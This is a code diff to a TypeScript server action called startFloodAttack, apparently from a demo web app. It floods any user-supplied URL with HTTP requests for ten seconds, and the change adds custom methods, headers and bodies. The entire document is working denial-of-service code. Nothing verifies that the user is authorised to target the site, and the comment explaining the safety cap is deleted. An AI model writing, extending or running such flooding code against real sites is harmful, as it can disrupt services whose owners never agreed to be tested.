@@ -1,3 +1,4 @@
+
 "use server";
 
 export interface FloodStats {
@@ -7,13 +8,17 @@ export interface FloodStats {
   error?: string;
 }
 
-// Fixed duration for the flood attack for this demo application
 const ATTACK_DURATION_SECONDS = 10;
+
+const METHODS_WITHOUT_BODY = ["GET", "HEAD", "DELETE", "OPTIONS"];
 
 export async function startFloodAttack(
   targetUrl: string,
-  concurrency: number,
-  rate: number // requests per second (RPS)
+  method: string,
+  headersString?: string,
+  body?: string,
+  concurrency?: number, // Made optional for now, will default if not provided
+  rate?: number // Made optional for now, will default if not provided
 ): Promise<FloodStats> {
   let parsedUrl: URL;
   try {
@@ -25,14 +30,50 @@ export async function startFloodAttack(
   if (parsedUrl.protocol !== "http:" && parsedUrl.protocol !== "https:") {
      return { totalSent: 0, successful: 0, failed: 0, error: "Target URL must use http or https protocol." };
   }
+  
+  const safeConcurrency = Math.min(concurrency ?? 10, 100); // Default to 10 if not provided
+  const safeRate = Math.min(rate ?? 10, 100); // Default to 10 if not provided
 
-  if (concurrency <= 0 || rate <= 0) {
+
+  if (safeConcurrency <= 0 || safeRate <= 0) {
     return { totalSent: 0, successful: 0, failed: 0, error: "Concurrency and rate must be positive integers." };
   }
-  
-  // Cap concurrency and rate server-side for safety in a demo app
-  const safeConcurrency = Math.min(concurrency, 100);
-  const safeRate = Math.min(rate, 100);
+
+  const parsedHeaders: HeadersInit = {};
+  if (headersString) {
+    headersString.split('\\n').forEach(line => {
+      const parts = line.split(':');
+      if (parts.length >= 2) {
+        const key = parts[0].trim();
+        const value = parts.slice(1).join(':').trim();
+        if (key && value) {
+          parsedHeaders[key] = value;
+        }
+      }
+    });
+  }
+
+  const fetchOptions: RequestInit = {
+    method: method.toUpperCase(),
+    headers: parsedHeaders,
+    signal: AbortSignal.timeout(5000) // Timeout for each request
+  };
+
+  if (body && !METHODS_WITHOUT_BODY.includes(method.toUpperCase())) {
+    fetchOptions.body = body;
+    // Ensure Content-Type is set if body is present and not already specified
+    if (!parsedHeaders['Content-Type'] && !parsedHeaders['content-type']) {
+        // Attempt to guess content type, default to application/json for non-empty body
+        try {
+            JSON.parse(body);
+            parsedHeaders['Content-Type'] = 'application/json';
+        } catch (e) {
+            parsedHeaders['Content-Type'] = 'text/plain';
+        }
+        fetchOptions.headers = parsedHeaders; // Re-assign headers if Content-Type was added
+    }
+  }
+
 
   let totalSent = 0;
   let successful = 0;
@@ -40,28 +81,22 @@ export async function startFloodAttack(
   const startTime = Date.now();
   const endTime = startTime + ATTACK_DURATION_SECONDS * 1000;
 
-  console.log(`Starting flood: ${targetUrl}, Concurrency: ${safeConcurrency}, Rate: ${safeRate} RPS, Duration: ${ATTACK_DURATION_SECONDS}s`);
+  console.log(`Starting flood: ${method} ${targetUrl}, Concurrency: ${safeConcurrency}, Rate: ${safeRate} RPS, Duration: ${ATTACK_DURATION_SECONDS}s`);
 
   try {
     while (Date.now() < endTime) {
       const batchStartTime = Date.now();
       const requestsInBatch: Promise<void>[] = [];
       
-      // Determine how many requests to send in this specific burst/iteration
-      // to not exceed overall rate over time.
-      // For simplicity, we send `safeConcurrency` requests per burst.
       const numRequestsThisBurst = safeConcurrency;
 
       for (let i = 0; i < numRequestsThisBurst; i++) {
-        if (Date.now() >= endTime) break; // Check time before each request in burst
+        if (Date.now() >= endTime) break;
 
         requestsInBatch.push(
-          fetch(targetUrl, { 
-            method: 'GET', 
-            signal: AbortSignal.timeout(5000) // Timeout for each request
-          }) 
+          fetch(targetUrl, fetchOptions) 
             .then(response => {
-              if (response.ok || (response.status >= 200 && response.status < 400)) { // Consider 2xx and 3xx as success
+              if (response.ok || (response.status >= 200 && response.status < 400)) {
                 successful++;
               } else {
                 failed++;
@@ -76,15 +111,10 @@ export async function startFloodAttack(
         );
       }
       
-      await Promise.allSettled(requestsInBatch); // Use allSettled to ensure all complete
+      await Promise.allSettled(requestsInBatch);
 
       if (Date.now() >= endTime) break;
 
-      // Calculate delay to maintain rate:
-      // We've sent `numRequestsThisBurst` requests.
-      // These should ideally be spread over `numRequestsThisBurst / safeRate` seconds.
-      // So, delay is `(numRequestsThisBurst / safeRate) * 1000` ms.
-      // Subtract time taken by the batch itself.
       const batchDurationMs = Date.now() - batchStartTime;
       const targetBatchIntervalMs = (numRequestsThisBurst / safeRate) * 1000;
       const delayMs = Math.max(0, targetBatchIntervalMs - batchDurationMs);
@@ -92,7 +122,6 @@ export async function startFloodAttack(
       if (delayMs > 0) {
         await new Promise(resolve => setTimeout(resolve, delayMs));
       }
-      // If batch took longer than target interval, we're falling behind rate, no extra delay.
     }
   } catch (e: any) {
     console.error("Flood attack error:", e);
